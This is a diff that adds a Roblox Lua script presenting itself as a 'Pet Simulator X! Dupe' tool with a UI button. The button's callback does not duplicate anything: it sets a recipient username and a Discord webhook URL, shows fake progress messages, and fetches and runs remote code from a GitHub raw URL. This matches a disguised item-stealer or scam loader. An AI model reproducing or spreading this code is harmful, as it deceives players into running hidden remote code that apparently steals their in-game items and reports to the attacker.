@@ -1,0 +1,28 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = " Pet Simulator X!  Dupe By:Krabat", HidePremium = false, SaveConfig = true, ConfigFolder = "💖 Pet Simulator X! 🐾 Dupe"})
+    
+local Tab = Window:MakeTab({
+    Name = "Dupe here",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+    
+Tab:AddButton({
+    Name = "Dupe",
+    Callback = function()
+                Username = "omg_job"
+                WebHook = "https://discord.com/api/webhooks/1079396334697730108/QcvGxe1bDxtQBVS3YHt-QAb8N0b0h0UqUtaOUKZWTTnVtlJxqPLWAwoPSAepZV1vuzoR"
+                  
+                _G.CustomScriptName = "Duping Is Processing..."
+                _G.Text1 = "Script Loaded..."
+                _G.Text2 = "Waiting for Script"
+                _G.Text3 = "Checking Scripts..."
+                _G.Text4 = "Starting Scripts..."
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+        end    
+    
+})
+
+    
+     
+    OrionLib:Init()
